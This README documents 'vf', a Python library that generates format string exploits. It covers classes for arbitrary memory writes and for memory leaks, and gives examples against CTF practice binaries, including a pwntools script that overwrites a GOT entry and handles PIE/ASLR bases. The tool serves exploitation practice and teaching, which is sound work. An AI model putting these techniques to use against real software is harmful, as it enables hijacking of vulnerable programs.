# vf

So this is a utility for generating format string exploits. It is designed to be called from within your python code.

There are two different classes specified within this. One is `WriteFmtStr` for format strings that are writing a value, and the other is `LeakFmtStr` for format strings that are leaking a value.

## Installation

To install it, just run the `setup.py`.

```
$	python3 setup.py install
```

Setuptools is needed for the installation, so you may need to install it:

```
$	pip3 install setuptools
```

## WriteFmtStr Usage

So for this class, these are the available arguments for it:

```
address
value
offset
arch
write_sizes
printed_bytes
alignment_bytes
value_base
address_base
```

Between these, the three required arguments are `address`, `value`, and `offset`. A simple example of one is:

```
fs = vf.WriteFmtStr(address = 0x08042060, value = 0x0804a028, offset = 12)
fs.generate_fmt_str()
```

First we create the class, the method `generate_fmt_str()` actually generate the format string. Here is an example exploit using `vf`.

```
from vf import *
from pwn import *

target = process("./bbpwn")

# Initialize the fmt string
fs = WriteFmtStr(
	value=0x0804870b, 
	address=0x0804a028, 
	offset=11, 
	arch=32, 
	printed_bytes = 70, 
	alignment_bytes=4)

# Generate the fmt string
fmt_str = fs.generate_fmt_str()

# Send the fmt string
target.sendline(fmt_str)
target.interactive()
```

#### address

This specifies the address that you are writing to. The argument expects an integer value, which is the address to be written to. This is the first mandatory argument. In this instance the address being written is `0x08046030`.

```
fs = vf.WriteFmtStr(value=0x08044008, address=0x08046030, offset=10)
```

#### value

This specifies the value that is being written. The argument expects an integer value, which is the value being written. This is the second mandatory argument. In this instance the value being written is `0x08044008`.

```
fs = vf.WriteFmtStr(value=0x08044008, address=0x08046030, offset=10)
```

#### offset

This specifies the stack offset to the start of your input, with respect to the `printf` call. The argument expects an integer value, which is the offset to the start of your input. This is the third and final mandatory argument. In this instance the offset is `6`.

```
fs = vf.WriteFmtStr(value=elf.symbols["pwned"], 
					address=elf.got["fflush"], 
					offset=6, 
					arch=64)
```

Here is what I mean by the offset to the start of your input.

```
$	./vf_64 
00000000.%6$lx
00000000.3030303030303030
```

#### arch

This specifies the architecture of the binary you are exploiting. Currently the two supported architectures are `x86` and `x86_64` (32 bit or 64 bit). For this, I take arguments as string and integer. Here are the arguments. The default value is 32 bit. This is not a required argument. 

32 bit:
```
32
86
"32"
"86"
```

64 bit:
```
64
"64"
```

Here are some examples of it:

```
fs = vf.WriteFmtStr(value = 0x402010, address = 0x601030, offset = 10, arch = 64)
fs = vf.WriteFmtStr(value = 0x08044008, address = 0x08046030, offset = 10, arch = "32")
fs = vf.WriteFmtStr(value = 0x08044008, address = 0x08046030, offset = 10, arch = 86)
```

#### write_sizes

So this argument specifies the number of writes you want, along with the sizes. This argument expects a list, where each element of that list is an integer that represents the size of the write in bytes. The first element represents the size of the first write, the second element represents the size of the second write, and so on and so forth. With this I specify that the first and second write will be `1` byte, and the final byte will be `2`.

```
fs = vf.WriteFmtStr(value=0x08044008, address=0x08046030, offset=10, write_sizes=[1, 1, 2])
```

This is one of three arguments that can specify the number of writes along with the size. The other two are `num_writes` and `max_size`. In the instance where multiple of these arguments are specified, then I will choose one of the arguments. How I choose which argument is whichever one comes first in this list, `write_sizes`, `num_writes`, then `max_size`.

The three arguments are all optional. In the event where any one of the three is not specified, then I go with the default write sizes. For `32` bit it is `2`, `2` byte writes. For `64` bit it is `4`, `2` byte writes.

#### num_writes

So this argument specifies the number of writes you want this write done in. This argument is an integer that represents the number of writes. The more writes you specify, the smaller each write will be (the size of each write is specified in the source code). For `32` bit, the values range from `1-4`, and for `64` bit the values range from `1-8`.

#### max_size

So this argument is for when you have a size restriction that you need to meet with your format string. The idea behind it is you specify the maximum size in bytes for your format string, and this tool chooses the number of writes, and write sizes in order to meet that. In the event that the max size in bytes is too low for the tool to guarantee, I raise an exception.

Here is an example where I use it:
```
fs = vf.WriteFmtStr(value=0x08044008, address=0x08046030, offset=10, max_size=20)
```

#### printed_bytes

This argument is for when there is additional data printed before your data, as part of the printf call. For instance, this is what I mean by it:

```
$	./bbpwn 
Hello baby pwner, whats your name?
000000000
Ok cool, soon we will know whether you pwned it or not. Till then Bye 000000000
```

Here we can see that the string `Ok cool, soon we will know whether you pwned it or not. Till then Bye `. Since the value we write directly depends on the number of bytes printed, this tool needs to know the number of bytes that are printed before our input, if there are any. This argument is an integer value that represents the number of bytes being printed.

```
fs = WriteFmtStr(value=0x0804870b, address=0x0804a028, offset=11, arch=32, printed_bytes = 70)
```

#### alignment_bytes

This argument is for when as part of our input, we need to place additional bytes at the start of our input, in order to align our addresses to a stack spot. Here is an example of it.

```
fs = WriteFmtStr(value=0x0804870b, address=0x0804a028, offset=11, arch=32, alignment_bytes=4)
```


#### value_base

This specifies the base for the `value` argument. It is helpful in situations where aslr randomizes the value you are trying to write. Essentially it just adds `value_base` to `value`. In this instance, `pie_base` get's added to the value which is the plt address of `pwned`, that way `value` holds the aslr value of `pwned`.

```
fs = vf.WriteFmtStr(value = elf.symbols["pwned"], 
					address = elf.got["fflush"], 
					value_base = pie_base, 
					address_base = pie_base, 
					offset=6)
```

#### address_base

This specifies the base for the `address` argument. It is helpful in situations where aslr randomizes the address you are trying to write to. Essentially it just adds `address_base` to `address`. In this instance, `pie_base` get's added to the address which is the got address of `fflush`, that way `address` holds the aslr got address for `fflush`.

```
fs = vf.WriteFmtStr(value = elf.symbols["pwned"], 
					address = elf.got["fflush"], 
					value_base = pie_base, 
					address_base = pie_base, 
					offset=6)
```

#### Generate

To actually generate the format string, use the `generate_fmt_str()` method. The value returned will be the format string. For example:

```
fs = vf.WriteFmtStr(value=0x08044008, address=0x08046030, offset=10)
fmt_str = fs.generate_fmt_str()
```

## LeakFmtStr Usage

So this class is designed for when you need to leak a value. For instance:

```
$	./echo 
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> %8$s
flag{g0ttem_b01z}

> ^C
```

To make an instance of this class, the syntax is pretty similar to `WriteFmtStr`:

```
leakFs = vf.LeakFmtStr(offset=8, data_type="s")
```

There are only two options for this class, both are mandatory.

#### offset

This specifies the stack offset to the start of your input, with respect to the `printf` call. The argument expects an integer value, which is the offset to the start of your input:

```
leakFs = vf.LeakFmtStr(offset=8, data_type="s")
```

#### data_type

This specifies the type of data your are wanting to leak. it's effectively the format you want it printed. This can be as `lx` for `8` byte long, `x` as integer, or `s` as a string (will interpret value as ptr and print whatever prints to), or `p` as ptr:

```
leakFs = vf.LeakFmtStr(offset=8, data_type="s")
```

## Examples

For example exploits using this tool, checkout: `https://github.com/guyinatuxedo/vf_examples`

## Testing

To test if vf is working:

```
$	python3 -m unittest unit_tests/test*
```

## What is VF

VF is an acronym that stands for Vengeance Falls, a great Trivium album. Here are some great songs off of it.

```
https://www.youtube.com/watch?v=CDJkUjWJoAo
https://www.youtube.com/watch?v=CDJkUjWJoAo
https://www.youtube.com/watch?v=0JlijhWVbac
```